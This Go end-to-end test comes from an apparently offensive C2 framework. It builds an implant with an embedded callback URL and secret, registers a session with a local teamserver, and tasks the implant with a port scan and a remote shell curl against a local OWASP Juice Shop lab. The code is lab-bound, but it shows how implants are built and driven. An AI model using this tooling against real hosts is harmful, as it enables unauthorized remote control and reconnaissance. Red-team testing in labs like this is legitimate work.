package e2e_test

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"testing"
	"time"

	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
	"github.com/KKingZero/erebus-exploit-framwork/server"
	"google.golang.org/protobuf/proto"
)

// TestJuiceShopRecon runs a real Linux implant against a live teamserver and
// exercises recon tasks against OWASP Juice Shop (host port 3000 by default).
func TestJuiceShopRecon(t *testing.T) {
	juiceURL := os.Getenv("JUICE_SHOP_URL")
	if juiceURL == "" {
		juiceURL = "http://127.0.0.1:3000/"
	}
	if !juiceShopReachable(juiceURL) {
		t.Skipf("juice shop not reachable at %s", juiceURL)
	}

	host, port, err := net.SplitHostPort(stripScheme(juiceURL))
	if err != nil {
		// default URL may not include explicit port in SplitHostPort path
		host = "127.0.0.1"
		port = "3000"
	}
	if host == "" {
		host = "127.0.0.1"
	}

	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Minute)
	defer cancel()

	secret, err := randomBytes(32)
	if err != nil {
		t.Fatal(err)
	}
	implantID := "juice-e2e-implant"

	grpcPort := freePort(t)
	httpsPort := freePort(t)
	dataDir := t.TempDir()

	ahDisabled := false
	cfg := &server.Config{
		GRPCAddr:      fmt.Sprintf("127.0.0.1:%d", grpcPort),
		DBPath:        filepath.Join(dataDir, "erebus.db"),
		DataDir:       dataDir,
		ImplantSecret: hex.EncodeToString(secret),
		AutoHarvest:   server.AutoHarvestYAML{Enabled: &ahDisabled},
		Listeners: []server.ListenerConfig{
			{Name: "juice-e2e-https", Protocol: "https", Host: "127.0.0.1", Port: uint32(httpsPort)},
		},
	}

	ts, err := server.NewTeamserver(cfg)
	if err != nil {
		t.Fatalf("new teamserver: %v", err)
	}
	t.Cleanup(func() { ts.Stop() })

	if err := ts.Start(); err != nil {
		t.Fatalf("start teamserver: %v", err)
	}
	waitForTCP(t, cfg.GRPCAddr, 5*time.Second)
	waitForTCP(t, fmt.Sprintf("127.0.0.1:%d", httpsPort), 5*time.Second)

	caPEM, err := os.ReadFile(filepath.Join(dataDir, "ca-cert.pem"))
	if err != nil {
		t.Fatalf("read ca cert: %v", err)
	}

	implantBin := filepath.Join(t.TempDir(), "implant")
	buildImplant(t, implantBin, implantID, hex.EncodeToString(secret), fmt.Sprintf("https://127.0.0.1:%d", httpsPort), base64.StdEncoding.EncodeToString(caPEM))

	implantCmd := exec.CommandContext(ctx, implantBin)
	implantCmd.Env = append(os.Environ(), "EREBUS_IMPLANT_QUIET=1")
	if err := implantCmd.Start(); err != nil {
		t.Fatalf("start implant: %v", err)
	}
	t.Cleanup(func() {
		if implantCmd.Process != nil {
			_ = implantCmd.Process.Kill()
		}
		_ = implantCmd.Wait()
	})

	grpcClient, _ := newGRPCClient(t, ts, cfg.GRPCAddr)

	var sessionID string
	deadline := time.Now().Add(20 * time.Second)
	for time.Now().Before(deadline) {
		sessions, err := grpcClient.ListSessions(ctx, &pb.ListSessionsRequest{})
		if err != nil {
			t.Fatalf("list sessions: %v", err)
		}
		for _, s := range sessions.Sessions {
			if s.ImplantId == implantID && s.Alive {
				sessionID = s.SessionId
				break
			}
		}
		if sessionID != "" {
			break
		}
		time.Sleep(200 * time.Millisecond)
	}
	if sessionID == "" {
		t.Fatal("implant never registered a live session")
	}
	t.Logf("session registered: %s", sessionID)

	// Port scan Juice Shop HTTP port
	scanData, _ := proto.Marshal(&pb.NetPortscanTask{
		Target:    host,
		Ports:     []uint32{mustParsePort(t, port)},
		TimeoutMs: 3000,
		Threads:   5,
	})
	scanResp, err := grpcClient.ExecuteTask(ctx, &pb.ExecuteTaskRequest{
		SessionId: sessionID,
		TaskType:  pb.TaskType_TASK_NET_PORTSCAN,
		Data:      scanData,
		Wait:      true,
		TimeoutMs: 30000,
	})
	if err != nil {
		t.Fatalf("portscan execute: %v", err)
	}
	if scanResp.Result == nil || !scanResp.Result.Success {
		t.Fatalf("portscan failed: %+v", scanResp.Result)
	}
	scanResult := &pb.NetPortscanResult{}
	if err := proto.Unmarshal(scanResp.Result.Data, scanResult); err != nil {
		t.Fatalf("unmarshal portscan: %v", err)
	}
	if len(scanResult.Ports) == 0 || !scanResult.Ports[0].Open {
		t.Fatalf("expected open port on %s:%s, got %+v", host, port, scanResult.Ports)
	}
	t.Logf("portscan: %s:%d open service=%q", host, scanResult.Ports[0].Port, scanResult.Ports[0].Service)

	// Shell curl against Juice Shop
	shellData, _ := proto.Marshal(&pb.ShellTask{
		Command: "curl",
		Args:    []string{"-s", "-o", "/dev/null", "-w", "%{http_code}", juiceURL},
	})
	shellResp, err := grpcClient.ExecuteTask(ctx, &pb.ExecuteTaskRequest{
		SessionId: sessionID,
		TaskType:  pb.TaskType_TASK_SHELL,
		Data:      shellData,
		Wait:      true,
		TimeoutMs: 30000,
	})
	if err != nil {
		t.Fatalf("shell execute: %v", err)
	}
	if shellResp.Result == nil || !shellResp.Result.Success {
		t.Fatalf("shell failed: %+v", shellResp.Result)
	}
	shellResult := &pb.ShellResult{}
	if err := proto.Unmarshal(shellResp.Result.Data, shellResult); err != nil {
		t.Fatalf("unmarshal shell: %v", err)
	}
	if shellResult.ExitCode != 0 {
		t.Fatalf("curl exit %d stderr=%q stdout=%q", shellResult.ExitCode, shellResult.Stderr, shellResult.Stdout)
	}
	if !bytes.Contains([]byte(shellResult.Stdout), []byte("200")) {
		t.Fatalf("expected HTTP 200 from juice shop, stdout=%q", shellResult.Stdout)
	}
	t.Logf("curl juice shop: HTTP %s", bytes.TrimSpace([]byte(shellResult.Stdout)))
}

func juiceShopReachable(url string) bool {
	client := &http.Client{Timeout: 3 * time.Second}
	resp, err := client.Get(url)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	return resp.StatusCode == http.StatusOK
}

func stripScheme(url string) string {
	if i := len("https://"); len(url) > i && url[:i] == "https://" {
		url = url[i:]
	}
	if i := len("http://"); len(url) > i && url[:i] == "http://" {
		url = url[i:]
	}
	if idx := len(url) - 1; idx >= 0 && url[idx] == '/' {
		url = url[:idx]
	}
	return url
}

func mustParsePort(t *testing.T, port string) uint32 {
	t.Helper()
	var p uint32
	if _, err := fmt.Sscanf(port, "%d", &p); err != nil {
		t.Fatalf("parse port %q: %v", port, err)
	}
	return p
}

func buildImplant(t *testing.T, out, implantID, secret, callbackURL, caPEM string) {
	t.Helper()
	wd, err := os.Getwd()
	if err != nil {
		t.Fatal(err)
	}
	repoRoot := filepath.Clean(filepath.Join(wd, "..", ".."))
	ldflags := fmt.Sprintf(
		"-s -w -X github.com/KKingZero/erebus-exploit-framwork/implant.implantID=%s "+
			"-X github.com/KKingZero/erebus-exploit-framwork/implant.implantSecret=%s "+
			"-X github.com/KKingZero/erebus-exploit-framwork/implant.callbackURL=%s "+
			"-X github.com/KKingZero/erebus-exploit-framwork/implant.sleepMs=1000 "+
			"-X github.com/KKingZero/erebus-exploit-framwork/implant.jitterPct=0 "+
			"-X github.com/KKingZero/erebus-exploit-framwork/implant.caCertPEM=%s "+
			"-X github.com/KKingZero/erebus-exploit-framwork/implant.transportType=https",
		implantID, secret, callbackURL, caPEM,
	)
	cmd := exec.Command("go", "build", "-ldflags", ldflags, "-o", out, "./cmd/implant")
	cmd.Dir = repoRoot
	cmd.Env = append(os.Environ(),
		fmt.Sprintf("TMPDIR=%s", filepath.Join(repoRoot, ".gotmp")),
		fmt.Sprintf("GOCACHE=%s", filepath.Join(repoRoot, ".gocache")),
	)
	outBytes, err := cmd.CombinedOutput()
	if err != nil {
		t.Fatalf("build implant: %v\n%s", err, outBytes)
	}
}

func randomBytes(n int) ([]byte, error) {
	b := make([]byte, n)
	f, err := os.Open("/dev/urandom")
	if err != nil {
		return nil, err
	}
	defer f.Close()
	_, err = f.Read(b)
	return b, err
}